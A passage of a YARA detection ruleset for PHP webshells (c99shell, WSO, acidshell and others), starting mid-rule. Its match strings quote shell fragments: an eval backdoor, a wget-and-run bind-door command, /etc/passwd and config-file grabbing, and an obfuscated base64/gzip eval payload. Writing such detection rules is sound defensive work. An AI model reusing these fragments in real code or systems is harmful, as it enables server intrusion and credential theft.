      $s17 = "YWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPjxmb250IGNvbG9yPSIjRkYwMDAwIj5Eb3dubG9hZCBG" fullword ascii
      $s18 = "ZSwgb3RoZXJ3aXNlIGl0IGRpc3BsYXlzIGEgbWVzc2FnZSB0byB0aGUgdXNlciBhbmQgcHJvdmlk" fullword ascii
      $s19 = "IyB0byB0aGUgdXNlciBhbmQgcHJvdmlkZXMgYSBsaW5rIHRocm91Z2ggd2hpY2ggdGhlIGZpbGUg" fullword ascii
      $s20 = "ZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25k" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x6873 ) and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _502adcbc50636b667202497c1f398a36413e3284_6f53dce817b117198fc0950d87e362fdcf7852e2_48
{
   meta:
      description = "php17 - from files 502adcbc50636b667202497c1f398a36413e3284.php, 6f53dce817b117198fc0950d87e362fdcf7852e2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "80fa31cc87c2618a5ea267baed3707f78b4b7d4a20cc8a91b231d5ce1d1a42e8"
      hash2 = "1dc571ae9a2775e50505fa455a9d32b6953bc00e16afbe7fc225e8993b2e6c7a"
   strings:
      $x1 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x2 = "?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?ph" ascii
      $x3 = "else {echo \"<b>Execution command</b>\";  if (empty($cmd_txt)) {$cmd_txt = true;}}" fullword ascii
      $s4 = "if (md5(sha1(md5($anypass))) == \"b76d95e82e853f3b0a81dd61c4ee286c\") {header(\"HTTP/1.0 200 OK\"); @eval($anyphpcode);}" fullword ascii
      $s5 = "service.pwd */ $aliases[] = array(\"find service.pwd files in current dir\", \"find . -type f -name service.pwd\");" fullword ascii
      $s6 = "if (!$sock) {echo \"I can't connect to localhost:\".$bind[port].\"! I think you should configure your firewall.\";}" fullword ascii
      $s7 = "config.inc.php */ $aliases[] = array(\"find config.inc.php files\", \"find / -type f -name config.inc.php\");" fullword ascii
      $s8 = "if (!empty($kill)) {$query = 'KILL ' . $kill . ';'; $result = mysql_query($query, $sql_sock); echo \"<b>Killing process #\".$" fullword ascii
      $s9 = "<input type=checkbox NAME=owner[2] value=1\".$owner_x.\">Execute</font></td><td><b>Group</b><br><br>" fullword ascii
      $s10 = "else {echo \"<br><a href=\\\"\".$surl.\"act=lsa&nixpasswd=1&d=\".$ud.\"\\\"><b><u>Get /etc/passwd</u></b></a><br>\";}" fullword ascii
      $s11 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=\\\"green\\\"><a href=\\\"\".$surl.\"act=f&f=accou" ascii
      $s12 = "*  Coded by tristram" fullword ascii
      $s13 = "config* */ $aliases[] = array(\"find config* files in current dir\", \"find . -type f -name \\\"config*\\\"\");" fullword ascii
      $s14 = "config* */ $aliases[] = array(\"find config* files\", \"find / -type f -name \\\"config*\\\"\");" fullword ascii
      $s15 = "if (!move_uploaded_file($uploadfile[tmp_name],$uploadpath.$destin)) {$uploadmess .= \"Error uploading file \".$uploadfile[name]" fullword ascii
      $s16 = "service.pwd ... frontpage =))) */ $aliases[] = array(\"find all service.pwd files\", \"find / -type f -name service.pwd\");" fullword ascii
      $s17 = "$sess_method = \"cookie\"; // \"cookie\" - Using cookies, \"file\" - using file, default - \"cookie\"" fullword ascii
      $s18 = "?><b>Binding port:</b><br><form method=\"POST\"><input type=\"hidden\" name=\"act\" value=\"bind\"><input type=\"hidden\" name=" ascii
      $s19 = "*  c99shell.php - " fullword ascii
      $s20 = "\"><input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Execute\\\">&nbsp;<input type=\\\"submit\\\" value=\\\"View&Edit com" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _069059b7ef840f0c74a814ec9237b6ec_7d4db150d48270409c1e179fa8bda76792b45c86_49
{
   meta:
      description = "php17 - from files 069059b7ef840f0c74a814ec9237b6ec.php, 7d4db150d48270409c1e179fa8bda76792b45c86.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cd73e2b32de14c58c3e27d833be05ec7fbfaf569ed10f18d47bf11352d6b4954"
      hash2 = "ed3ea75fde5557fa1726641f46fd08085c495e2402bb943cbe4c452ce113028e"
   strings:
      $s1 = "$port[4000] = \"icq, command-n-conquer and shell nfm\";" fullword ascii
      $s2 = "$port[49] = \"TACACS, Login Host Protocol\";" fullword ascii
      $s3 = "$port[543] = \"KLogin, AppleShare over IP\";" fullword ascii
      $s4 = "$port[513] = \"who, rlogin\";" fullword ascii
      $s5 = "$port[45] = \"Message Processing Module [recv]\";" fullword ascii
      $s6 = "$port[2301] = \"Compaq Insight Management Web Agents\";" fullword ascii
      $s7 = "$port[23456] = \"EvilFTP\";" fullword ascii
      $s8 = "$port[512] = \"biff, rexec\";" fullword ascii
      $s9 = "$port[115] = \"sftp (Simple File Transfer Protocol)\";" fullword ascii
      $s10 = "$port[69] = \"Trivial File Transfer Protocol (tftp)\";" fullword ascii
      $s11 = "$port[27] = \"ETRN (NSW User System FE)\";" fullword ascii
      $s12 = "$port[104] = \"ACR-NEMA Digital Imag. & Comm. 300\";" fullword ascii
      $s13 = "$port[45000] = \"Cisco NetRanger postofficed\";" fullword ascii
      $s14 = "$port[25] = \"SMTP (Simple Mail Transfer)\";" fullword ascii
      $s15 = "$port[3031] = \"Apple AgentVU\";" fullword ascii
      $s16 = "$port[5555] = \"Personal Agent\";" fullword ascii
      $s17 = "$port[705] = \"AgentX for SNMP\";" fullword ascii
      $s18 = "$port[81] = \"HOSTS2 Name Serve\";" fullword ascii
      $s19 = "$port[57] = \"MTP (any private terminal access)\";" fullword ascii
      $s20 = "$port[5678] = \"Remote Replication Agent Connection\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _2250b6f81f0189b50fb5391a1a4c5738370cfa61_404_404__2__50
{
   meta:
      description = "php17 - from files 2250b6f81f0189b50fb5391a1a4c5738370cfa61.php, 404.php, 404__2_.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "30a287d13b6729cebd14e7e3078428a7a9d0d4e3868fd6a1247a050721bbcb92"
      hash2 = "00772e6c4839045b73e078c73645f441daf9bfffc95f5604b6995e7792eedf66"
      hash3 = "851c740b3ab1c15cbff2daf0098ac87c00b4b1496675d14e0ee95f307c3b3c01"
   strings:
      $x1 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(null,nul" fullword ascii
      $x2 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=''\"; " fullword ascii
      $x3 = "<input type=\"button\" value=\"hashcrack.com\" onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document" fullword ascii
      $x4 = "Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass' value='wso'> Using: <select nam" fullword ascii
      $x5 = "<input type=\"button\" value=\"md5decrypter.com\" onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf" fullword ascii
      $s6 = "'<td>:<nobr>'.substr(@php_uname(), 0, 120).'  <a href=\"http://www.google.com/search?q='.urlencode(@php_uname()).'\" targ" fullword ascii
      $s7 = "showSecParam('Downloaders', implode(', ',$temp)); " fullword ascii
      $s8 = "<input type=\"button\" value=\"milw0rm.com\" onclick=\"document.hf.action='http://www.milw0rm.com/cracker/search.php';doc" fullword ascii
      $s9 = "<input type=\"button\" value=\"md5.rednoize.com\" onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf." fullword ascii
      $s10 = "$temp = \"document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='\".addcsla" fullword ascii
      $s11 = "<input type=\"button\" value=\"hashcracking.info\" onclick=\"document.hf.action='https://hashcracking.info/index.php';doc" fullword ascii
      $s12 = "echo '<h1>Console</h1><div class=content><form name=cf onsubmit=\"if(document.cf.cmd.value==\\'clear\\'){document.cf.output.val" fullword ascii
      $s13 = "echo '</textarea><input type=text name=cmd style=\"border-top:0;width:100%;margin:0;\" onkeydown=\"kp(event);\">'; " fullword ascii
      $s14 = "$out = ex(which(\"perl\").\" /tmp/bc.pl \".$_POST['p2'].\" \".$_POST['p3'].\" &\"); " fullword ascii
      $s15 = "showSecParam('OS version', @file_get_contents('/proc/version')); " fullword ascii
      $s16 = "showSecParam('Distr name', @file_get_contents('/etc/issue.net')); " fullword ascii
      $s17 = "$bind_port_c=\"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCi" fullword ascii
      $s18 = "showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir')); " fullword ascii
      $s19 = "echo \"</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 \".($_SESSION[md5($_SERVER['HTTP_" fullword ascii
      $s20 = "$out = ex(which(\"perl\").\" /tmp/bp.pl \".$_POST['p2'].\" &\"); " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _15febc7c452fb361fc5eca8e67711a86a9ee0b9e_36c1b4eaebafcab661febec9cbce65e6c4e063d4_67782cfe732cea7fbc4c91e9133b005ad9401377__51
{
   meta:
      description = "php17 - from files 15febc7c452fb361fc5eca8e67711a86a9ee0b9e.php, 36c1b4eaebafcab661febec9cbce65e6c4e063d4.php, 67782cfe732cea7fbc4c91e9133b005ad9401377.php, 9f18fc1e8b779eec4d289eea454f05549d387a51.php, acid.php, acidshell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash2 = "dad311ac627ea5509814218f21e1f11d0f61632866aadaf5c3a43629f5801c1b"
      hash3 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
      hash4 = "d43cdb0daf132269b0a706a1a1b4970450fbaba34492e056305cab320f8c4ba5"
      hash5 = "a6580477b138c01f062a33f2f204f412d3ffcdfd44dd6bffe476aefefab1fca3"
      hash6 = "a455a962041f9ef980414ecb1695c263cea42c41731caf1f0c34293cc937b1ef"
   strings:
      $x1 = "elseif ( enabled(\"passthru\") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x2 = "elseif ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x3 = "if ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x4 = "array(\"wget & run BindDoor\",\"wget \".$sh_mainurl.\"bind.tgz;tar -zxvf bind.tgz;./4877\")," fullword ascii
      $s5 = "<input type=hidden name=\"cmd_txt\" value=\"1\"> <input type=submit name=submit value=\"Execute\">" fullword ascii
      $s6 = "<title>'.getenv(\"HTTP_HOST\").' - '.sh_name().'</title>" fullword ascii
      $s7 = "else {echo \"<a href=\\\"\".$surl.\"act=security&nixpasswd=1&d=\".$ud.\"\\\"><b>Download /etc/passwd</b></a>\";}" fullword ascii
      $s8 = "elseif ( enabled(\"shell_exec\") ) { $output = shell_exec($cmd); }" fullword ascii
      $s9 = "if (!file_get_contents($v)) { echo \"<a href=\\\"\".$surl.\"act=f&f=sam&d=\".$_SERVER[\"WINDIR\"].\"\\\\repair&ft=download\\\"><" ascii
      $s10 = "\"<input type=submit name=submit value=\\\"Execute\\\"><hr noshade size=1>\\r\\n\";" fullword ascii
      $s11 = "elseif ( enabled(\"exec\") ) { exec($cmd,$o); $output = join(\"\\r\\n\",$o); }" fullword ascii
      $s12 = "echo $safemodeexecdir ? \"SafemodeExecDir: \".$safemodeexecdir.\"<br>\\n\" : \"\";" fullword ascii
      $s13 = "echo \"IP Address: <a href=\\\"http://ws.arin.net/cgi-bin/whois.pl?queryinput=\".@gethostbyname($_SERVER[\"HTTP_HOST\"]).\"\\\">" ascii
      $s14 = "echo \"IP Address: <a href=\\\"http://ws.arin.net/cgi-bin/whois.pl?queryinput=\".@gethostbyname($_SERVER[\"HTTP_HOST\"]).\"\\\">" ascii
      $s15 = "echo \"<div class=barheader>.: Results of Execution :.</div>\\n\";" fullword ascii
      $s16 = "</select> <input type=submit name=submit value=\"Execute\">" fullword ascii
      $s17 = "\"download\" => array(\"exe\",\"com\",\"pif\",\"src\",\"lnk\",\"zip\",\"rar\",\"gz\",\"tar\")" fullword ascii
      $s18 = "if (empty($processes_sort)) { $processes_sort = $sort_default; }" fullword ascii
      $s19 = "if ($processes_sort[1] == \"d\") { $prcs = array_reverse($prcs); }" fullword ascii
      $s20 = "if ($line[0] == get_current_user()) { $line[0] = \"<font color=green>\".$line[0].\"</font>\"; }" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbbef ) and filesize < 600KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _365b390fe892b3112719506f9240ff389d9e19d4_3df1afbcfa718da6fc8af27554834ff6d1a86562_7f9506dd9412394c3923fbfc324bcb4a3f5e5701_52
{
   meta:
      description = "php17 - from files 365b390fe892b3112719506f9240ff389d9e19d4.php, 3df1afbcfa718da6fc8af27554834ff6d1a86562.php, 7f9506dd9412394c3923fbfc324bcb4a3f5e5701.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4b04fc64a7669cab1815bc144f9bd1291ccc8cda5d645815ed6e35de89e0157b"
      hash2 = "208d43053620304c82210270e449f217044a7e9c60d0bbff382fd0e2da0b868d"
      hash3 = "96090e0fc01b79efb907234e25f516bdc348c55385874bf810a60c6240c56f96"
   strings:
      $s1 = "print \" - <a target='_blank' href=\".inclink('dlink', 'phpinfo').\">Php Bilgi</a>\";" fullword ascii
      $s2 = "{if(function_exists(exec)){$nval=exec($ocmd);}elseif(!function_exists(exec)){$nval=shell_exec($ocmd);}" fullword ascii
      $s3 = "print $sf.\"<textarea cols=157 rows=23 name=edittxt>\"; $alltxt= file_get_contents($_REQUEST['edit']);" fullword ascii
      $s4 = "print \" - <a href=\".inclink('dlink', 'cmdhlp').\"&scdir=$nscdir>Cmd Yard" fullword ascii
      $s5 = "tir.</b></center></div>\"; }else{print \"<center><b>: Error uploading<font color=red> $file </font>: </b></center>\";} } } } " fullword ascii
      $s6 = "print \" - <a href=\".inclink('dlink', 'showsrc').\"&scdir=$nscdir>Dosya Kayna" fullword ascii
      $s7 = "$hlp = escapeshellcmd($hlp);print \"<p><table width=100% height=30% bgcolor=#FF0000 border=2><tr><td>\";" fullword ascii
      $s8 = "print \" - <a href=\".inclink('dlink', 'perm').\"&scdir=$nscdir>" fullword ascii
      $s9 = "print \" - <a href=\".inclink('dlink', 'qindx').\"&scdir=$nscdir>" fullword ascii
      $s10 = "textarea{background-color:#FFFFFF;color:#FF0000;font-weight:bold;font-size: 12px;font-family: Tahoma; border: 1 solid #FF0000;}" fullword ascii
      $s11 = "print \"<br><table style=\\\"border:2px #FF0000 solid \\\" width=100% height=%>\"; print\"<tr><td><font size=2 face=tahoma>\"; " fullword ascii
      $s12 = "print \"<br><table  style=\\\"border:2px #FF0000 solid \\\" width=100% height=%>\"; print\"<tr><td><font size=2 face=tahoma>\";" fullword ascii
      $s13 = "print \" - <a href=\".inclink('dlink', 'urlen').\">Url Kodlay" fullword ascii
      $s14 = "print \" - <a href=\".inclink('dlink', 'urld').\">Url Kod " fullword ascii
      $s15 = "print \" - <a href=\".inclink('dlink', 'basepw').\">Base64 " fullword ascii
      $s16 = "print\"<table bgcolor=#191919 style=\\\"border:2px #FF0000 solid \\\" width=100% height=%>\";print\"<tr><td>\"; print\"<b>" fullword ascii
      $s17 = "buraya yaz</textarea></p>\";input (\"text\",\"mailto\",\"mail adresi\",35);print \" \";input (\"text\",\"subj\",\"Ba" fullword ascii
      $s18 = "<option value='t8'>Make</option></select> \";input('text','ustname','',51);print \" \";input('submit','ustsub','Ger" fullword ascii
      $s19 = "print\"<center><table bgcolor=#2A2A2A style=\\\"border:1px solid white\\\" width=100% height=6% ></center>\"; " fullword ascii
      $s20 = "RK <font face=tahoma color=white size=7> SHELL" fullword ascii
   condition:
      ( uint16(0) == 0xbbef and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _8d23f3d3f678d3e620b91c2115e1f714_adminer_4_2_4_2_53
{
   meta:
      description = "php17 - from files 8d23f3d3f678d3e620b91c2115e1f714.php, adminer-4.2.4_2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a8d9f5df8a604e75e87670bc1d797bb49cc1047f722a8630bda514fdc407f84f"
      hash2 = "ea21b95da1a2f66d26849160f3257823254663144e6b3b506c35160b70c7b3bd"
   strings:
      $s1 = "name(){return\"<a href='https://www.adminer.org/' target='_blank' id='h1'>Adminer</a>\";}function" fullword ascii
      $s2 = "<a href=\"https://www.adminer.org/#download\" target=\"_blank\" id=\"version\">',(version_compare($ia,$_COOKIE[\"adminer_version" ascii
      $s3 = "<a href=\"https://www.adminer.org/#download\" target=\"_blank\" id=\"version\">',(version_compare($ia,$_COOKIE[\"adminer_version" ascii
      $s4 = "PKTABLE_NAME\"];$q[\"source\"][]=$K[\"FKCOLUMN_NAME\"];$q[\"target\"][]=$K[\"PKCOLUMN_NAME\"];}return$J;}function" fullword ascii
      $s5 = "processInput($o,$Y,$r=\"\"){if($r==\"SQL\")return$Y;$C=$o[\"field\"];$J=q($Y);if(preg_match('~^(now|getdate|uuid)$~',$r))$J=\"$r" ascii
      $s6 = "($n);$l=&get_session(\"dbs\");if(DB!=\"\"&&$l&&!in_array(DB,$l,true))$l=null;stop_session();define(\"PAGE_HEADER\",1);}function" fullword ascii
      $s7 = "connect($N,$V,$G){$this->_link=@mysql_connect(($N!=\"\"?$N:ini_get(\"mysql.default_host\")),(\"$N$V\"!=\"\"?$V:ini_get(\"mysql.d" ascii
      $s8 = "preg_match('~WebKit~i',$_SERVER[\"HTTP_USER_AGENT\"])?$X:\"https://www.adminer.org/redirect/?url=\".urlencode($X));}$J=$b->editV" ascii
      $s9 = "client_encoding=utf8'\";$this->dsn(\"$P dbname='\".($m!=\"\"?addcslashes($m,\"'\\\\\"):\"postgres\").\"'\",$V,$G);return" fullword ascii
      $s10 = "* @link https://www.adminer.org/" fullword ascii
      $s11 = "urce\"][]=$K[\"from\"];$q[\"target\"][]=$K[\"to\"];}return$J;}function" fullword ascii
      $s12 = ").\"&\":\"\").\"username=\".urlencode($V).($m!=\"\"?\"&db=\".urlencode($m):\"\").($B[2]?\"&$B[2]\":\"\");}function" fullword ascii
      $s13 = "selectOrderProcess($p,$v){$J=array();foreach((array)$_GET[\"order\"]as$x=>$X){if($X!=\"\")$J[]=(preg_match('~^((COUNT\\\\(DISTIN" ascii
      $s14 = "processInput($o,$Y,$r=\"\"){if($r==\"SQL\")return$Y;$C=$o[\"field\"];$J=q($Y);if(preg_match('~^(now|getdate|uuid)$~',$r))$J=\"$r" ascii
      $s15 = "';$s=-1;foreach(process_list()as$s=>$K){if(!$s){echo\"<thead><tr lang='en'>\".(support(\"kill\")?\"<th>&nbsp;\":\"\");foreach($K" ascii
      $s16 = "r($C))):\"\");}echo\"</thead>\\n\";}echo\"<tr\".odd().\">\";foreach($K" fullword ascii
      $s17 = "foreign_keys($Q){$J=array();foreach(get_rows(\"EXEC sp_fkeys @fktable_name = \".q($Q))as$K){$q=&$J[$K[\"FK_NAME\"]];$q[\"table\"" ascii
      $s18 = "foreign_keys($Q){$J=array();foreach(get_rows(\"EXEC sp_fkeys @fktable_name = \".q($Q))as$K){$q=&$J[$K[\"FK_NAME\"]];$q[\"table\"" ascii
      $s19 = "Min_DB{var$extension=\"Firebird\",$server_info,$affected_rows,$errno,$error,$_link,$_result;function" fullword ascii
      $s20 = "false;}$this->error=\"\";if($I===true){$this->affected_rows=ibase_affected_rows($this->_link);return" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _15febc7c452fb361fc5eca8e67711a86a9ee0b9e_36c1b4eaebafcab661febec9cbce65e6c4e063d4_398fcc4176cbdefb9271ad67decbab5c08312bf2__54
{
   meta:
      description = "php17 - from files 15febc7c452fb361fc5eca8e67711a86a9ee0b9e.php, 36c1b4eaebafcab661febec9cbce65e6c4e063d4.php, 398fcc4176cbdefb9271ad67decbab5c08312bf2.php, 67782cfe732cea7fbc4c91e9133b005ad9401377.php, 9f18fc1e8b779eec4d289eea454f05549d387a51.php, acid.php, acidshell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash2 = "dad311ac627ea5509814218f21e1f11d0f61632866aadaf5c3a43629f5801c1b"
      hash3 = "2884d456f6a33415db1ce6c8ef4a9a6ed860b3f76482c8460d27bd83120858ab"
      hash4 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
      hash5 = "d43cdb0daf132269b0a706a1a1b4970450fbaba34492e056305cab320f8c4ba5"
      hash6 = "a6580477b138c01f062a33f2f204f412d3ffcdfd44dd6bffe476aefefab1fca3"
      hash7 = "a455a962041f9ef980414ecb1695c263cea42c41731caf1f0c34293cc937b1ef"
   strings:
      $s1 = "echo \"<a href=\\\"ftp://\".$login.\":\".$pass.\"@\".$host.\"\\\" target=\\\"_blank\\\"><b>Connected to \".$host.\" with login " ascii
      $s2 = "elseif ($sql_act == \"tbldump\") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl)" fullword ascii
      $s3 = "array(\"Find *config*.php in current dir\", \"dir /s /w /b *config*.php\")," fullword ascii
      $s4 = "\"<tr><td><form enctype=\\\"multipart/form-data\\\" action=\\\"\".$surl.\"act=upload&d=\".urlencode($d).\"\\\" method=POST>\"." fullword ascii
      $s5 = "array(\"Find c99shell in current dir\", \"find /c \\\"c99\\\" *\")," fullword ascii
      $s6 = "array(\"Find r57shell in current dir\", \"find /c \\\"r57\\\" *\")," fullword ascii
      $s7 = "# Dumped by \".$sh_name.\"" fullword ascii
      $s8 = "array(\"Find config* files in current dir\", \"find . -type f -name \\\"config*\\\"\")," fullword ascii
      $s9 = "array(\"Find Suid bins\",\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\")," fullword ascii
      $s10 = "echo \"<table width=\\\"100%\\\" border=0><tr><td><b>Please, fill the form:</b><table><tr><td><b>Username</b></td><td><b>Passwor" ascii
      $s11 = "if (@ftp_login($sock,$login,$pass)) {" fullword ascii
      $s12 = "array(\"Find config* files\", \"find / -type f -name \\\"config*\\\"\")," fullword ascii
      $s13 = "array(\"Find service.pwd files in current dir\", \"find . -type f -name service.pwd\")," fullword ascii
      $s14 = "array(\"Find config.inc.php files\", \"find / -type f -name config.inc.php\")," fullword ascii
      $s15 = "array(\"Find index.php in current dir\", \"dir /s /w /b index.php\")," fullword ascii
      $s16 = "array(\"Find all service.pwd files\", \"find / -type f -name service.pwd\")," fullword ascii
      $s17 = "ql_passwd).\"&sql_server=\".htmlspecialchars($sql_server).\"&sql_port=\".htmlspecialchars($sql_port).\"&\");" fullword ascii
      $s18 = "if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo \"<a href=\\\"\".$sql_surl.\"sql_tbl=\".url" fullword ascii
      $s19 = "array(\"<img src=\\\"\".$surl.\"act=img&img=buffer\\\" alt=\\\"Buffer\\\" border=\\\"0\\\">\",$surl.\"act=fsbuff&d=%d\")" fullword ascii
      $s20 = "array(\"<img src=\\\"\".$surl.\"act=img&img=search\\\" alt=\\\"Search\\\" border=\\\"0\\\">\",$surl.\"act=search&d=%d\")," fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbbef ) and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _7ff60365f646e09b30b6b3dd7fe768fa841100df_aa0fc6f621e8b2965b3a109832117d023f4a1ad6_55
{
   meta:
      description = "php17 - from files 7ff60365f646e09b30b6b3dd7fe768fa841100df.php, aa0fc6f621e8b2965b3a109832117d023f4a1ad6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "644801c4c42c2055912131e963b263204fe95131e9af26eb1ed2c99af6a8387e"
      hash2 = "2a0cd4aab8539cd4e85ece7e5a8251ae6cc21816a20023f6ddb5d979c98d2cb3"
   strings:
      $x1 = "eval(gzuncompress(base64_decode(\"eJzsvfl3G8eROP6z/J7/h9GYK4AmiIP3IVDiTUq8RJA6qceHY0BABDDQAOAhW/u/MNpNvLJ2I0qkLoq6SJsUZVEUSUmOnn" ascii
      $s2 = "Evrb/TuuaGdY25WGbbH03lWTb57fK4yyokIVXam8jEA4o2jH7Gfjz7g1SMw8fse+zuRPa6h0qc9com/Q8spGYPYdpy3hsJsnP7SDll0f9ER+9VYOdgngWbMPVe4zLRVt" ascii
      $s3 = "8I+KpOlBwK9I5WeTwDY321R7vaajsPtySUQS196shgaH9oX21vurbx4Fh/GYx2qqq3FRaT/fsHNX+bMhkaGKv1nzzRUn6qsbl98mCgzF3R3dt3srIjcbKyU3UnR8dSHZ" ascii
      $s4 = "EA0+LbTANoF1h/fyhi6O0zXCWx3IimKImGPIj9j5Hvh5YWWXKqhQS9lagB4u8ircQVmOvx/08uSjuEp3+Zuwds26UQbINEQuuZfz2NiX9HFsaWJ3I6sdmBH/ZZ7K3V6q" ascii
      $s5 = "lsogIrCwXSKnFnI6fvxEvLPMHYzSy6vNMCxlzEBJpDKMAIYIa9FSkQBFIBDVb3/o+g3d1DbY+eQ56/e+YmpYCZAPr0puvk3MoSljTkHUNBHND1//hnpl+ZF6GVP65tFu" ascii
      $s6 = "oSTN5YEUetMqwQcdYTOdeiJVBx/mEJtXbuVkiBicRD6fyXrTv34UZWfP0CXx2fNw4vhkPkQ2+p3SLSkJ4bh1SRA2MHWdhMsLlCdvvK8Nz3kdR8A2lcyVWmv7jrb3SFFG" ascii
      $s7 = "tbFJhMk+C3bugk/SFleaRbrLKbgiRcyqcMViMrClHraMMeHZ7XzuDu3i3VFEtvS71aiCYZs0DiZbzYeKW7IuCudFcVv0XQLCmpl6gQlU7zBJ29yfB4MwnGABjMykV+05" ascii
      $s8 = "hq0kyftpTHRt9B3M4uEiELdKWSmcjlvLtAk3w2qlrJaWOtpEFVthg6GLj45N966IomQeTryyt+YStpURxkekTPId94FlpojCUZTz2O1+/YQbIiasYAh190cNFEJm0s5P" ascii
      $s9 = "f6X6V2MMytVQ9cLkD1gMyyv5UGYVDO0CIsgCeUceTilxx/Azh6iucZftPSzNY/qp9svTrDSmZ6rzTlDytxfH2huLjoFLmhZBolbhbB2ID3Zhe+MQ0cC2DeF0munuUPMN" ascii
      $s10 = "gCfGuOY7JN7uUVtuJftpHY7viR1oN+WF/oFVnm1m237fMnMn5t0uZt8DhsbUpAY9/KHLZuEm/C21DusDUmtWgMPlZgKmZXOmz7MgkMtFqFn2KYVg3lMiOZFMb1rHHYfE" ascii
      $s11 = "cJpmkR8+dREf5hE34JScP0LOjXbtakxRewgCcwMZq/t9cksVQR0dkaV2z0HV/JQFWIgg9cKWSqKGtdonxdEYe1sqBctBLdSbNoTTiWt9f6uPDbiqWZiLyKBK2h4CoU1F" ascii
      $s12 = "LOG/akOjqYoZLPdja/frTzTRwdjAYRldgej15ejE4MWXSTQcu1AyGOn29v/vJ595peg7YsLR/3CEz3t5ce6UMbjtk8GPKxIHWPx6cXZyNdpbpGxzbhseed5beud8A0hS" ascii
      $s13 = "uXSDfdSLtdCWEaLc47KsaXwWGrEqKaWsuNVxYFl2fnPrz74PolHpzFTANLIpjs+rDakNXj9df2ElOGsXCgVY/cus+rRWBfeSflKtCySOAtr1wp89WPrX0YYIPdZyi8rB" ascii
      $s14 = "/iQKsL0uaDd2e+mn8Xn5BA8A/u3Jq59O3S+sb5B/+F++d7P7u07LQkbzZnFWYo/grDD8dK9K0E9rxnHgeRzacYsBT56fxDLL35FJSaVHLy1u9nF1lN9uTC17dmps4UYi" ascii
      $s15 = "OTYVahMGnk4MFh0BB4DO/5rt3hMgKfJKffJJA1eLkF427USbsJIBa1ms81mSpwMg08IjPVjgSx0EWXfMI/5qdXQ+uoEBuyPfrkytdXf7z40WPyBvnGwq0ZbAQffMHDan" ascii
      $s16 = "59ybHmTHO4Md09eaIi1lyyPxlLH5qcGIsOlKSrx5KHBypHu8uDsZMnS1KJxmT5vvbDWk31ESXeHT7cmKmeODGqdB/qqjnce1BLATmS42PhEzWd1XHgxUBzJLHvQGcmHR" ascii
      $s17 = "87dWbu6srShblL/zH931cW//mfX38tP08jP89/vPJtfp4uSinamKJlcMYN+1r7D7b2S8dsHQMDfcMdvb4B23EnTz5m6+vog89dbbbj9XrFJFbkbOdPpWheUE1OZrQY5A" ascii
      $s18 = "UlliQlx6L7yh55eXh6MHptBA8EMLsFcBg5/po0AAmJpe5Hqf55H82BeF+VaJD+B/190J0=\")))?>" fullword ascii
